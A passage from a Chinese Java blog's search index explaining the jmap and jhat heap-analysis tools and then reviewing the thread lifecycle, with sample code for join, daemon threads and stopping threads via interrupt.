(2283.5MB) # Eden区总容量\n   used     = 42456832 (40.489990234375MB) # Eden区已使用\n   free     = 2351966464 (2243.010009765625MB) # Eden区剩余容量\n   1.7731548164823736% used  # Eden区使用比率\nFrom Space: # 其中一个Survivor区的内存分布\n   capacity = 212336640 (202.5MB)\n   used     = 0 (0.0MB)\n   free     = 212336640 (202.5MB)\n   0.0% used \nTo Space: # 另一个Survivor区的内存分布\n   capacity = 221773824 (211.5MB)\n   used     = 0 (0.0MB)\n   free     = 221773824 (211.5MB)\n   0.0% used\nPS Old Generation # 当前的Old区内存分布\n   capacity = 1039138816 (991.0MB)\n   used     = 487669936 (465.0782928466797MB)\n   free     = 551468880 (525.9217071533203MB)\n   46.93020109451864% used\n\n49107 interned Strings occupying 4515704 bytes.\n```\n\n## jmap -histo:live 7676| more：打印堆的对象统计，包括对象数、内存大小等等 \n\n> 因为在**dump:live**前会进行**full gc**，如果带上**live**则只统计活对象，因此不加**live**的堆大小要大于加**live**堆的大小 \n\n```bat\n num    #instances       #bytes  class name\n----------------------------------------------\n   1:       264504      133851  [C\n   2:       266752       64020  java.lang.String\n   3:       197556       63217  java.util.HashMap$Node\n   4:         9794       54849  com.ssp.user.model.Userinfo\n   5:        58254       36364  [Ljava.lang.Object;\n   6:        11204       18546  [Ljava.util.HashMap$Node;\n   7:        72959       17510  java.util.ArrayList\n   8:         4897       13321  com.ssp.model.WareInfo\n   9:        16716        8023  java.util.TreeMap\n  10:        15798        7583  java.util.HashMap\n  11:        17063        6825  java.util.TreeMap$Entry\n  12:        11155        6247  java.util.LinkedHashMap\n  13:        16706        5346  java.util.Collections$SynchronizedMap\n  14:         5635        4959  java.lang.reflect.Method\n  15:         4895        4699  com.ssp.index.model.DataAuthor\n  16:          795        4262  [B\n  17:        16694        4006  jeasy.analysis.Dictionary\n  18:        16779        2684  java.lang.Character\n  19:         8271        2646  java.util.concurrent.ConcurrentHashMap$Node\n  20:          947        1737  [I\n  21:         1336        1502  java.lang.Class\n  22:         2658        1063  java.util.LinkedHashMap$Entry\n  23:         2212        1062  org.aspectj.weaver.reflect.ShadowMatchImpl\n  24:          432         899  com.ssp.model.report.Aport\n  25:         5177         828  java.util.LinkedHashMap$LinkedKeySet\n  26:         3658         820  [Ljava.lang.Class;\n-- More  --\n```\n\nxml **class** name是对象类型，说明如下：\n\n|   显示   | 说明 |\n| ---- | ---- |\n|B| byte|\n|C| char|\n|D| double|\n|F| float|\n|I| int|\n|J| long|\n|Z| boolean|\n|[ 数组| 如[I表示int[]|\n|[L+类名|  其他对象|\n\n\n\n\n\n## jmap -finalizerinfo 7676：打印等待回收对象的信息\n\n```bat\nC:\\Users\\Administrator>  jmap -finalizerinfo 7676\nAttaching to process ID 7676, please wait...\nDebugger attached successfully.\nServer compiler detected.\nJVM version is 25.131-b11\nNumber of objects pending for finalization: 0\n```\n\n可以看到当前F-QUEUE队列中并没有等待Finalizer线程执行finalizer方法的对象。\n\n## jmap -dump:live,format=b,file=dump.hprof 7676 : 提取MAT分析文件\n\ndump.hprof 这个后缀是为了后续可以直接用MAT(Memory Anlysis Tool)打开。\n\n\n\n\n\n\n\n# jhat：虚拟机堆转储快照分析工具\n\njhat（JVM Heap Analysis Tool）命令与jmap搭配使用，来**分析jmap生成的堆转储快照**。\n\n\n\njhat内置了一个微型的HTTP/HTML服务器，生成dump文件的分析结果后，可以在浏览器中查看。\n\n不过实事求是地说，在实际工作中，除非手上真的没有别的工具可用，否则一般都不会去直接使用jhat命令来分析dump文件，主要原因有二：\n\n一是一般不会在部署应用程序的服务器上直接分析dump文件，即使可以这样做，也会尽量将dump文件复制到其他机器。\n\n二是用于分析的机器一般也是服务器，由于加载dump快照文件需要比生成dump更大的内存，所以一般在64位JDK、大内存的服务器上进行分析，因为分析工作是一个耗时而且消耗硬件资源的过程，既然都要在其他机器进行，就没有必要受到命令行工具的限制了；\n\n另一个原因是jhat的分析功能相对来说比较简陋，VisualVM，以及专业用于分析dump文件的Eclipse Memory Analyzer、IBM HeapAnalyzer等工具，都能实现比jhat更强大更专业的分析功能。\n\n\n\n命令格式：  **jhat** [option] [dumpfile]\n\nOPTION参数：\n\n| 参数 | 说明 |\n| ---- | ---- |\n| -stack false\\|true | 默认值为 true<br />关闭对象分配调用栈跟踪(tracking object allocation call stack) <br />如果分配位置信息在堆转储中不可用，则必须将此标志设置为 false<br /> |\n| -refs false\\|true | 关闭对象引用跟踪(tracking of references to objects)。  默认值为 true。  <br />默认情况下, 返回的指针是指向其他特定对象的对象,如反向链接或输入引用(referrers or incoming references), 会统计/计算堆中的所有对象。 |\n| -port port-number | 设置 jhat HTTP server 的端口号。  默认值 7000 |\n| -exclude exclude-file | 指定对象查询时需要排除的数据成员列表文件(a file that lists data members that should be excluded from the reachable objects query)。 <br />例如, 如果文件列列出了 java.lang.String.value , 那么当从某个特定对象 Object o 计算可达的对象列表时, 引用路径涉及 java.lang.String.value 的都会被排除。 |\n| -baseline exclude-file | 指定一个基准堆转储(baseline heap dump)。 <br />在两个 heap dumps 中有相同 object ID 的对象会被标记为不是新的(marked as not being new)<br />其他对象被标记为新的(new)。   在比较两个不同的堆转储时很有用 |\n| -debug int | 设置 debug 级别. 0 表示不输出调试信息。 <br />值越大则表示输出更详细的 debug 信息。 |\n| -version | 启动后只显示版本信息就退出 |\n| -J< flag > | 因为 jhat 命令实际上会启动一个JVM来执行, 通过 -J 可以在启动JVM时传入一些启动参数。  <br />例如, -J-Xmx512m 则指定运行 jhat 的Java虚拟机使用的最大堆内存为 512 MB<br />如果需要使用多个JVM启动参数,则传入多个 -Jxxxxxx. |\n|  |  |\n\n**jhat dump.hprof**：查看之前jmap生成的 **dump.hprof**\n\n```bat\nC:\\Users\\Administrator>jhat dump.hprof\nReading from dump.hprof...\nDump file created Wed Apr 26 10:44:41 CST 2023\nSnapshot read, resolving...\nResolving 185857 objects...\nChasing references, expect 37 dots.....................................\nEliminating duplicate references.....................................\nSnapshot resolved.\nStarted HTTP server on port 7000\nServer is ready.\n```\n\n屏幕显示 **Server is ready**的提示后，用户在浏览器中键入http://localhost:7000/就可以看到分析结果\n\n> 分析结果默认是以包为单位进行分组显示。\n>\n> 分析内存泄漏问题主要会使用到其中的“Heap Histogram”（与jmap -histo功能一样）与OQL页签的功能。\n>\n> 前者可以找到内存中总容量最大的对象，后者是标准的对象查询语言，使用类似SQL的语法对内存中的对象进行查询统计\n\n","tags":["Java"],"categories":["后端","Java"]},{"title":"JVM基础回顾","url":"/20250619/6cd20d81.html","content":"\n\n\n## 线程生命周期\n\n当线程被创建并启动以后，它既不是一启动就进入了执行状态，也不是一直处于执行状态。在线程的生命周期中，它要经过 **新建（New）、就绪（Runnable）、运行（Running）、阻塞（Blocked）和死亡（Dead）5种状态**。尤其是当线程启动以后，它不可能一直\"霸占\"着CPU独自运行，所以CPU需要在多条线程之间切换，于是 **线程状态也会多次在运行、阻塞之间切换**。\n\n\n\n### 0. 生命周期图\n\n![7126254-55d47d5ebef3b1e2](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/7126254-55d47d5ebef3b1e2-16380810237142.webp)  \n\n\n\n\n\n### 1. 新建（New）状态\n\n当程序使用new关键字创建了一个线程之后，该线程就处于 **新建状态**，此时的线程情况如下：\n\n- 此时JVM**为其分配内存，并初始化其成员变量的值**；\n- 此时**线程对象**没有表现出任何线程的动态特征，程序也不会执行线程的线程执行体；\n\n\n\n### 2. 就绪（Runnable）状态\n\n- 此时JVM会为其**创建方法调用栈和程序计数器**；\n- 该状态的线程一直处于**线程就绪队列**（尽管是采用队列形式，事实上，把它称为可运行池而不是可运行队列。因为CPU的调度不一定是按照先进先出的顺序来调度的），线程并没有开始运行；\n- 此时线程**等待系统为其分配CPU时间片**，并不是说执行了start()方法就立即执行；\n\n#### 调用start()方法与run()方法对比\n\n1. **调用start()方法来启动线程，系统会把该run()方法当成线程执行体来处理**。\n2. 直接调用线程对象的run()方法，则run()方法立即就会被执行，而且在run()方法返回之前其他线程无法并发执行。也就是说，**系统把线程对象当成一个普通对象，而run()方法也是一个普通方法，而不是线程执行体**；\n\n3. 需要指出的是，调用了线程的run()方法之后，**该线程已经不再处于新建状态**，不要再次调用线程对象的start()方法。**只能对处于新建状态的线程调用start()方法，否则将引发==IllegaIThreadStateExccption==异常**；\n\n#### 如何让子线程调用start()方法之后立即执行而非\"等待执行\"：\n\n程序可以使用Thread.sleep(1) 来让当前运行的线程（主线程）睡眠1毫秒，1毫秒就够了，**因为在这1毫秒内CPU不会空闲，它会去执行另一个处于就绪状态的线程，这样就可以让子线程立即开始执行**；\n\n\n\n### 3. 运行（Running）状态\n\n当CPU开始调度处于 **就绪状态** 的线程时，此时线程获得了CPU时间片才得以真正开始执行run()方法的线程执行体，则该线程处于 **运行状态**。\n\n```\n如果计算机只有一个CPU，那么在任何时刻只有一个线程处于运行状态；\n如果在一个多处理器的机器上，将会有多个线程并行执行，处于运行状态；\n当线程数大于处理器数时，依然会存在多个线程在同一个CPU上轮换的现象；\n```\n\n处于运行状态的线程最为复杂，它 **不可能一直处于运行状态（除非它的线程执行体足够短，瞬间就执行结束了）**，线程在运行过程中需要被中断，**目的是使其他线程获得执行的机会，线程调度的细节取决于底层平台所采用的策略**。线程状态可能会变为 **阻塞状态、就绪状态和死亡状态**。比如：\n\n1. 对于采用 **抢占式策略** 的系统而言，系统会给每个可执行的线程分配一个时间片来处理任务；当该时间片用完后，系统就会剥夺该线程所占用的资源，让其他线程获得执行的机会。线程就会又 **从运行状态变为就绪状态**，重新等待系统分配资源；\n\n2. 对于采用 **协作式策略**的系统而言，只有当一个线程调用了它的yield()方法后才会放弃所占用的资源—**也就是必须由该线程主动放弃所占用的资源**，线程就会又 **从运行状态变为就绪状态**。\n\n\n\n### 4. 阻塞（Blocked）状态\n\n处于运行状态的线程在某些情况下，让出CPU并暂时停止自己的运行，进入 **阻塞状态**。\n\n#### 线程将会进入阻塞状态可能原因\n\n1. **线程调用sleep()方法**，主动放弃所占用的处理器资源，暂时进入中断状态（**不会释放持有的对象锁**），时间到后等待系统分配CPU继续执行；\n\n2. **线程调用一个阻塞式IO方法**，在该方法返回之前，该线程被阻塞；\n\n3. **线程试图获得一个同步监视器**，但该同步监视器正被其他线程所持有;\n\n4. **程序调用了线程的suspend方法将线程挂起**；\n\n5. **线程调用wait**，等待notify/notifyAll唤醒时(会释放持有的对象锁)；\n\n#### 阻塞状态分类\n\n1. **等待阻塞**：运行状态中的 **线程执行wait()方法**，使本线程进入到等待阻塞状态；\n\n2. **同步阻塞**：线程在 **获取synchronized同步锁失败**（因为锁被其它线程占用），它会进入到同步阻塞状态；\n\n3. **其他阻塞**：通过调用线程的 **sleep()或join()或发出I/O请求** 时，线程会进入到阻塞状态。当 **sleep()状态超时、join()等待线程终止或者超时、或者I/O处理完毕** 时，线程重新转入就绪状态；\n\n\n\n**在阻塞状态的线程只能进入就绪状态，无法直接进入运行状态**。而就绪和运行状态之间的转换通常不受程序控制，**而是由系统线程调度所决定**。当处于就绪状态的线程获得处理器资源时，该线程进入运行状态；**当处于运行状态的线程失去处理器资源时，该线程进入就绪状态**。\n\n但有一个方法例外，**调用yield()方法可以让运行状态的线程转入就绪状态**。\n\n\n\n### 4.1 无限等待（WAITING）状态\n\n线程处于 **无限制等待状态**，等待一个特殊的事件来重新唤醒，如：\n\n> 1. 通过wait()方法进行等待的线程等待一个notify()或者notifyAll()方法；\n> 2. 通过join()方法进行等待的线程等待目标线程运行结束而唤醒；\n\n以上两种一旦通过相关事件唤醒线程，线程就进入了 **就绪（RUNNABLE）状态** 继续运行。\n\n#### 4.2 时限等待（TIMED_WAITING）状态\n\n线程进入了一个 **时限等待状态**，如：**sleep(3000)**，等待3秒后线程重新进行 **就绪（RUNNABLE）状态** 继续运行。\n\n### 5. 死亡（Dead）状态\n\n线程会以如下3种方式结束，结束后就处于 **死亡状态**：\n\n1. **run()或call()方法执行完成**，线程正常结束（**TERMINATED状态**）\n\n2. **线程抛出一个未捕获的Exception或Error**；\n\n3. **直接调用该线程stop()方法来结束该线程**（该方法容易导致死锁，通常不推荐使用）\n\n   \n\n**处于死亡状态的线程对象也许是活的，但是，它已经不是一个单独执行的线程**。线程一旦死亡，就不能复生。 **如果在一个死去的线程上调用start()方法，会抛出java.lang.IllegalThreadStateException异常**。所以，需要注意的是：**一旦线程通过start()方法启动后就再也不能回到新建（NEW）状态，线程终止后也不能再回到就绪（RUNNABLE）状态**。\n\n\n\n#### 5.1 终止（TERMINATED）状态\n\n线程执行完毕后，进入终止（TERMINATED）状态。\n\n### 6. 线程相关方法\n\n```java\npublic class Thread{\n    // 线程的启动\n    public void start(); \n    // 线程体\n    public void run(); \n    // 已废弃\n    public void stop(); \n    // 已废弃\n    public void resume(); \n    // 已废弃\n    public void suspend(); \n    // 在指定的毫秒数内让当前正在执行的线程休眠\n    public static void sleep(long millis); \n    // 同上，增加了纳秒参数\n    public static void sleep(long millis, int nanos); \n    // 测试线程是否处于活动状态\n    public boolean isAlive(); \n    // 中断线程\n    public void interrupt(); \n    // 测试线程是否已经中断\n    public boolean isInterrupted(); \n    // 测试当前线程是否已经中断\n    public static boolean interrupted(); \n    // 等待该线程终止\n    public void join() throws InterruptedException; \n    // 等待该线程终止的时间最长为 millis 毫秒\n    public void join(long millis) throws InterruptedException; \n    // 等待该线程终止的时间最长为 millis 毫秒 + nanos 纳秒\n    public void join(long millis, int nanos) throws InterruptedException; \n}\n```\n\n#### 6.1 线程就绪、运行和死亡状态转换\n\n1. **就绪状态转换为运行状态**：此线程得到CPU资源；\n2. **运行状态转换为就绪状态**：此线程主动调用yield()方法或在运行过程中失去CPU资源。\n3. **运行状态转换为死亡状态**：此线程执行执行完毕或者发生了异常；\n\n注意：\n\n当调用线程中的yield()方法时，线程从运行状态转换为就绪状态，**但接下来CPU调度就绪状态中的那个线程具有一定的随机性**，因此，可能会出现A线程调用了yield()方法后，接下来CPU仍然调度了A线程的情况。\n\n\n\n#### 6.2 run & start\n\n通过调用start启动线程，线程执行时会执行run方法中的代码。\n\n```java\nstart()：线程的启动；\nrun()：线程的执行体；\n```\n\n#### 6.3 sleep & yield\n\n##### sleep()\n\n```java\n通过sleep(millis)使线程进入休眠一段时间，该方法在指定的时间内无法被唤醒，同时也不会释放对象锁。\n\nsleep是静态方法，最好不要用Thread的实例对象调用它，因为它睡眠的始终是当前正在运行的线程，而不是调用它的线程对象，它只对正在运行状态的线程对象有效\n\nJava线程调度是Java多线程的核心，只有良好的调度，才能充分发挥系统的性能，提高程序的执行效率。但是不管程序员怎么编写调度，只能最大限度的影响线程执行的次序，而不能做到精准控制。因为使用sleep方法之后，线程是进入阻塞状态的，只有当睡眠的时间结束，才会重新进入到就绪状态，而就绪状态进入到运行状态，是由系统控制的，我们不可能精准的去干涉它，所以如果调用Thread.sleep(1000)使得线程睡眠1秒，可能结果会大于1秒。\n```\n\n##### yield()\n\n```\n与sleep类似，也是Thread类提供的一个静态的方法，它也可以让当前正在执行的线程暂停，让出CPU资源给其他的线程。但是和sleep()方法不同的是，它不会进入到阻塞状态，而是进入到就绪状态。\n\nyield()方法只是让当前线程暂停一下，重新进入就绪线程池中，让系统的线程调度器重新调度器重新调度一次，完全可能出现这样的情况：当某个线程调用yield()方法之后，线程调度器又将其调度出来重新进入到运行状态执行。\n\n实际上，当某个线程调用了yield()方法暂停之后，优先级与当前线程相同，或者优先级比当前线程更高的就绪状态的线程更有可能获得执行的机会，当然，只是有可能，因为我们不可能精确的干涉cpu调度线程。\n```\n\n**关于sleep()方法和yield()方的区别如下**\n\n```\nsleep方法暂停当前线程后，会进入阻塞状态，只有当睡眠时间到了，才会转入就绪状态。而yield方法调用后 ，是直接进入就绪状态，所以有可能刚进入就绪状态，又被调度到运行状态；\n\nsleep方法声明抛出了InterruptedException，所以调用sleep方法的时候要捕获该异常，或者显示声明抛出该异常。而yield方法则没有声明抛出任务异常；\n\nsleep方法比yield方法有更好的可移植性，通常不要依靠yield方法来控制并发线程的执行；\n```\n\n#### 6.4 join\n\n线程的合并的含义就是 **将几个并行线程的线程合并为一个单线程执行**，应用场景是 **当一个线程必须等待另一个线程执行完毕才能执行时**，Thread类提供了join方法来完成这个功能，**注意，它不是静态方法**。\n\njoin有3个重载的方法：\n\n```\nvoid join()    \n    当前线程等该加入该线程后面，等待该线程终止。    \nvoid join(long millis)    \n    当前线程等待该线程终止的时间最长为 millis 毫秒。 如果在millis时间内，该线程没有执行完，那么当前线程进入就绪状态，重新等待cpu调度   \nvoid join(long millis,int nanos)    \n    等待该线程终止的时间最长为 millis 毫秒 + nanos 纳秒。如果在millis时间内，该线程没有执行完，那么当前线程进入就绪状态，重新等待cpu调度\n\n```\n\n\n\n举例：\n\n```java\n/**\n * 在主线程中调用thread.join(); 就是将主线程加入到thread子线程后面等待执行。不过有时间限制，为1毫秒。\n */\npublic class Test1 {\n    public static void main(String[] args) throws InterruptedException {\n        MyThread t = new MyThread();\n        t.start();\n        //将主线程加入到子线程后面，不过如果子线程在1毫秒时间内没执行完，则主线程便不再等待它执行完，进入就绪状态，等待cpu调度  \n        t.join(1);\n        for (int i = 0; i < 30; i++) {\n            System.out.println(Thread.currentThread().getName() + \"线程第\" + i + \"次执行\");\n        }\n    }\n}\n\nclass MyThread extends Thread {\n    @Override\n    public void run() {\n        for (int i = 0; i < 1000; i++) {\n            System.out.println(this.getName() + \"线程，第\" + i + \"次执行\");\n        }\n    }\n}\n```\n\n**在JDK中join方法的源码，如下：**\n\n```java\npublic final synchronized void join(long millis)  throws InterruptedException {  \n    long base = System.currentTimeMillis();  \n    long now = 0;  \n  \n    if (millis < 0) {  \n        throw new IllegalArgumentException(\"timeout value is negative\");  \n    }  \n          \n    if (millis == 0) {  \n        while (isAlive()) {  \n           wait(0);  \n        }  \n    } else {  \n        while (isAlive()) {  \n            long delay = millis - now;  \n            if (delay <= 0) {  \n                break;  \n            }  \n            wait(delay);  \n            now = System.currentTimeMillis() - base;  \n        }  \n    }  \n}  \n```\n\n\n\n**join方法实现是通过调用wait方法实现**。当main线程调用t.join时候，**main线程会获得线程对象t的锁（wait 意味着拿到该对象的锁)，调用该对象的wait(等待时间)，直到该对象唤醒main线程**，比如退出后。**这就意味着main 线程调用t.join时，必须能够拿到线程t对象的锁**。\n\n\n\n#### 6.5 suspend & resume (已过时)\n\nsuspend-**线程进入阻塞状态，但不会释放锁**。此方法已不推荐使用，**因为同步时不会释放锁，会造成死锁的问题**。\n\nresume-**使线程重新进入可执行状态**。\n\n为什么 Thread.suspend 和 Thread.resume 被废弃了？\n\nThread.suspend 天生容易引起死锁。**如果目标线程挂起时在保护系统关键资源的监视器上持有锁，那么其他线程在目标线程恢复之前都无法访问这个资源。如果要恢复目标线程的线程在调用 resume 之前试图锁定这个监视器，死锁就发生了**。这种死锁一般自身表现为“冻结（ frozen ）”进程。\n\n**其他相关资料：**\n\n> https://blog.csdn.net/dlite/article/details/4212915\n\n#### 6.6 stop（已过时）\n\n**不推荐使用，且以后可能去除，因为它不安全**。为什么 Thread.stop 被废弃了？\n\n因为其天生是不安全的。**停止一个线程会导致其解锁其上被锁定的所有监视器（监视器以在栈顶产生ThreadDeath异常的方式被解锁）**。如果之前被这些监视器保护的任何对象处于不一致状态，其它线程看到的这些对象就会处于不一致状态。**这种对象被称为受损的 （damaged）**。当线程在受损的对象上进行操作时，会导致任意行为。这种行为可能微妙且难以检测，也可能会比较明显。\n\n**不像其他未受检的（unchecked）异常， ThreadDeath 悄无声息的杀死及其他线程**。因此，用户得不到程序可能会崩溃的警告。崩溃会在真正破坏发生后的任意时刻显现，甚至在数小时或数天之后。\n\n**其他相关资料：**\n\n> https://blog.csdn.net/dlite/article/details/4212915\n\n#### 6.7 wait & notify/notifyAll\n\nwait & notify/notifyAll这三个都是Object类的方法。使用 wait ，notify 和 notifyAll **前提是先获得调用对象的锁**。\n\n> 1. 调用 wait 方法后，释放持有的对象锁，**线程状态有 Running 变为 Waiting**，并将当前线程放置到对象的 **等待队列**；\n> 2. 调用notify 或者 notifyAll 方法后，**等待线程依旧不会从 wait 返回，需要调用 noitfy 的线程释放锁之后，等待线程才有机会从 wait 返回**；\n> 3. notify 方法：**将等待队列的一个等待线程从等待队列中移到同步队列中** ，而 notifyAll 方法：**将等待队列中所有的线程全部移到同步队列，被移动的线程状态由 Waiting 变为 Blocked**。\n\n前面一直提到两个概念，**等待队列（等待池），同步队列（锁池）**，这两者是不一样的。具体如下：\n\n> **同步队列（锁池）**：假设线程A已经拥有了某个对象（注意:不是类）的锁，而其它的线程想要调用这个对象的某个synchronized方法(或者synchronized块)，由于这些线程在进入对象的synchronized方法之前必须先获得该对象的锁的拥有权，但是该对象的锁目前正被线程A拥有，**所以这些线程就进入了该对象的同步队列（锁池）中，这些线程状态为Blocked**。\n>\n> **等待队列（等待池）**：假设一个线程A调用了某个对象的wait()方法，线程A就会释放该对象的锁（因为wait()方法必须出现在synchronized中，这样自然在执行wait()方法之前线程A就已经拥有了该对象的锁），同时 **线程A就进入到了该对象的等待队列（等待池）中，此时线程A状态为Waiting**。如果另外的一个线程调用了相同对象的notifyAll()方法，那么 **处于该对象的等待池中的线程就会全部进入该对象的同步队列（锁池）中，准备争夺锁的拥有权**。如果另外的一个线程调用了相同对象的notify()方法，那么 **仅仅有一个处于该对象的等待池中的线程（随机）会进入该对象的同步队列（锁池）**。\n\n\n\n#### 6.8 线程优先级\n\n每个线程执行时都有一个优先级的属性，**优先级高的线程可以获得较多的执行机会，而优先级低的线程则获得较少的执行机会**。与线程休眠类似，线程的优先级仍然无法保障线程的执行次序。只不过，**优先级高的线程获取CPU资源的概率较大，优先级低的也并非没机会执行**。\n\n> **每个线程默认的优先级都与创建它的父线程具有相同的优先级，在默认情况下，main线程具有普通优先级**；\n\nThread类提供了setPriority(int newPriority)和getPriority()方法来设置和返回一个指定线程的优先级，其中setPriority方法的参数是一个整数，范围是1~10之间，也可以使用Thread类提供的三个静态常量：\n\n```\nMAX_PRIORITY   =10\nMIN_PRIORITY   =1\nNORM_PRIORITY   =5\n```\n\n**注意一点**：\n\n> 虽然Java提供了10个优先级别，但这些优先级别需要操作系统的支持。**不同的操作系统的优先级并不相同，而且也不能很好的和Java的10个优先级别对应**。所以我们应该使用MAX_PRIORITY、MIN_PRIORITY和NORM_PRIORITY三个静态常量来设定优先级，**这样才能保证程序最好的可移植性**。\n\n\n\n#### 6.9 守护线程\n\n守护线程与普通线程写法上基本没啥区别，**调用线程对象的方法setDaemon(true)**，则可以将其设置为守护线程。\n\n守护线程使用的情况较少，但并非无用，举例来说，**JVM的垃圾回收、内存管理等线程都是守护线程**。还有就是在做数据库应用时候，使用的数据库连接池，**连接池本身也包含着很多后台线程，监控连接个数、超时时间、状态等等**。\n\n**setDaemon方法详细说明**：\n\n> public final void setDaemon(boolean on)：将该线程标记为守护线程或用户线程。**当正在运行的线程都是守护线程时，Java 虚拟机退出**。\n>\n> **该方法必须在启动线程前调用**。 该方法首先调用该线程的 checkAccess 方法，且不带任何参数。这可能抛出 SecurityException（在当前线程中）。\n>\n> **参数：**\n>\n> ```\n> on - 如果为 true，则将该线程标记为守护线程。\n> ```\n>\n> **抛出：**\n>\n> ```\n> IllegalThreadStateException - 如果该线程处于活动状态。\n> SecurityException - 如果当前线程无法修改该线程。\n> ```\n\n```\n/** \n* Java线程：线程的调度-守护线程 \n*/  \npublic class Test {  \n        public static void main(String[] args) {  \n                Thread t1 = new MyCommon();  \n                Thread t2 = new Thread(new MyDaemon());  \n                t2.setDaemon(true);        //设置为守护线程  \n  \n                t2.start();  \n                t1.start();  \n        }  \n}  \n  \nclass MyCommon extends Thread {  \n        public void run() {  \n                for (int i = 0; i < 5; i++) {  \n                        System.out.println(\"线程1第\" + i + \"次执行！\");  \n                        try {  \n                                Thread.sleep(7);  \n                        } catch (InterruptedException e) {  \n                                e.printStackTrace();  \n                        }  \n                }  \n        }  \n}  \n  \nclass MyDaemon implements Runnable {  \n        public void run() {  \n                for (long i = 0; i < 9999999L; i++) {  \n                        System.out.println(\"后台线程第\" + i + \"次执行！\");  \n                        try {  \n                                Thread.sleep(7);  \n                        } catch (InterruptedException e) {  \n                                e.printStackTrace();  \n                        }  \n                }  \n        }  \n}  \n```\n\n执行结果：\n\n```\n后台线程第0次执行！  \n线程1第0次执行！  \n线程1第1次执行！  \n后台线程第1次执行！  \n后台线程第2次执行！  \n线程1第2次执行！  \n线程1第3次执行！  \n后台线程第3次执行！  \n线程1第4次执行！  \n后台线程第4次执行！  \n后台线程第5次执行！  \n后台线程第6次执行！  \n后台线程第7次执行！ \n复制代码\n```\n\n从上面的执行结果可以看出：**前台线程是保证执行完毕的，后台线程还没有执行完毕就退出了**。\n\n> 实际上：**JRE判断程序是否执行结束的标准是所有的前台执线程行完毕了，而不管后台线程的状态，因此，在使用后台线程时候一定要注意这个问题**。\n\n\n\n#### 6.10 如何结束一个线程\n\n**Thread.stop()、Thread.suspend、Thread.resume、Runtime.runFinalizersOnExit** 这些终止线程运行的方法已经被废弃了，使用它们是极端不安全的！想要安全有效的结束一个线程，可以使用下面的方法。\n\n> 1. 正常执行完run方法，然后结束掉；\n> 2. 控制循环条件和判断条件的标识符来结束掉线程；\n\n**比如run方法这样写**：只要保证在一定的情况下，run方法能够执行完毕即可。而不是while(true)的无限循环。\n\n```\nclass MyThread extends Thread {  \n    int i=0;  \n    @Override  \n    public void run() {  \n        while (true) {  \n            if(i==10)  \n                break;  \n            i++;  \n            System.out.println(i);  \n              \n        }  \n    }  \n}  \n或者\nclass MyThread extends Thread {  \n    int i=0;  \n    boolean next=true;  \n    @Override  \n    public void run() {  \n        while (next) {  \n            if(i==10)  \n                next=false;  \n            i++;  \n            System.out.println(i);  \n        }  \n    }  \n}  \n或者\nclass MyThread extends Thread {  \n    int i=0;  \n    @Override  \n    public void run() {  \n        while (true) {  \n            if(i==10)  \n                return;  \n            i++;  \n            System.out.println(i);  \n        }  \n    }  \n}  \n复制代码\n```\n\n诚然，使用上面方法的标识符来结束一个线程，是一个不错的方法，但其也有弊端，如果 **该线程是处于sleep、wait、join的状态时候，while循环就不会执行**，那么我们的标识符就无用武之地了，**当然也不能再通过它来结束处于这3种状态的线程了**。\n\n**所以，此时可以使用interrupt这个巧妙的方式结束掉这个线程**。我们先来看看sleep、wait、join方法的声明：\n\n```\npublic final void wait() throws InterruptedException \npublic static native void sleep(long millis) throws InterruptedException\npublic final void join() throws InterruptedException\n复制代码\n```\n\n可以看到，这三者有一个共同点，都抛出了一个InterruptedException的异常。**在什么时候会产生这样一个异常呢**？\n\n> **每个Thread都有一个中断状状态，默认为false**。可以通过Thread对象的isInterrupted()方法来判断该线程的中断状态。可以通过Thread对象的interrupt()方法将中断状态设置为true。\n>\n> 当一个线程处于sleep、wait、join这三种状态之一的时候，**如果此时他的中断状态为true，那么它就会抛出一个InterruptedException的异常**，并将中断状态重新设置为false。\n\n看下面的简单的例子：\n\n```\npublic class Test1 {  \n    public static void main(String[] args) throws InterruptedException {  \n        MyThread thread=new MyThread();  \n        thread.start();  \n    }  \n}  \n  \nclass MyThread extends Thread {  \n    int i=1;  \n    @Override  \n    public void run() {  \n        while (true) {  \n            System.out.println(i);  \n            System.out.println(this.isInterrupted());  \n            try {  \n                System.out.println(\"我马上去sleep了\");  \n                Thread.sleep(2000);  \n                this.interrupt();  \n            } catch (InterruptedException e) {  \n                System.out.println(\"异常捕获了\"+this.isInterrupted());  \n                return;  \n            }  \n            i++;  \n        }  \n    }  \n}  \n```\n\n测试结果：\n\n```\n1  \nfalse  \n我马上去sleep了  \n2  \ntrue  \n我马上去sleep了  \n异常捕获了false \n```\n\n可以看到，首先执行第一次while循环，在第一次循环中，睡眠2秒，然后将中断状态设置为true。**当进入到第二次循环的时候，中断状态就是第一次设置的true，当它再次进入sleep的时候，马上就抛出了InterruptedException异常，然后被我们捕获了**。然后中断状态又被重新自动设置为false了（从最后一条输出可以看出来）。\n\n所以，我们可以使用interrupt方法结束一个线程。具体使用如下：\n\n```\npublic class Test1 {  \n    public static void main(String[] args) throws InterruptedException {  \n        MyThread thread=new MyThread();  \n        thread.start();  \n        Thread.sleep(3000);  \n        thread.interrupt();  \n    }  \n}  \n  \nclass MyThread extends Thread {  \n    int i=0;  \n    @Override  \n    public void run() {  \n        while (true) {  \n            System.out.println(i);  \n            try {  \n                Thread.sleep(1000);  \n            } catch (InterruptedException e) {  \n                System.out.println(\"中断异常被捕获了\");  \n                return;  \n            }  \n            i++;  \n        }  \n    }  \n} \n```\n\n多测试几次，会发现一般有两种执行结果：\n\n```\n0  \n1  \n2  \n中断异常被捕获了\n```\n\n或者\n\n```\n0  \n1  \n2  \n3  \n中断异常被捕获了 \n```\n\n这两种结果恰恰说明了，**只要一个线程的中断状态一旦为true，只要它进入sleep等状态，或者处于sleep状态，立马回抛出InterruptedException异常**。\n\n> **第一种情况**，是当主线程从3秒睡眠状态醒来之后，调用了子线程的interrupt方法，此时子线程正处于sleep状态，立马抛出InterruptedException异常。\n>\n> **第二种情况**，是当主线程从3秒睡眠状态醒来之后，调用了子线程的interrupt方法，此时子线程还没有处于sleep状态。然后再第3次while循环的时候，在此进入sleep状态，立马抛出InterruptedException异常。\n\n\n\n----\n\n\n\n##  JVM Class Loader\n\n\n\n### 结束一个JVM的生命周期\n\n1. System.exit：`Runtime.getRuntime().exit(status)`\n\n2. 正常执行结束\n\n3. 程序抛出异常\n\n4. JVM Crash（异常）\n\n5. 操作系统/硬件异常\n\n   \n\n### 类加载的三个过程\n\n查看class文件的二进制代码`javap -v BasicThread`\n\n```sh\ncd target/classes/com/hots/part1/chapter1\njavap -v 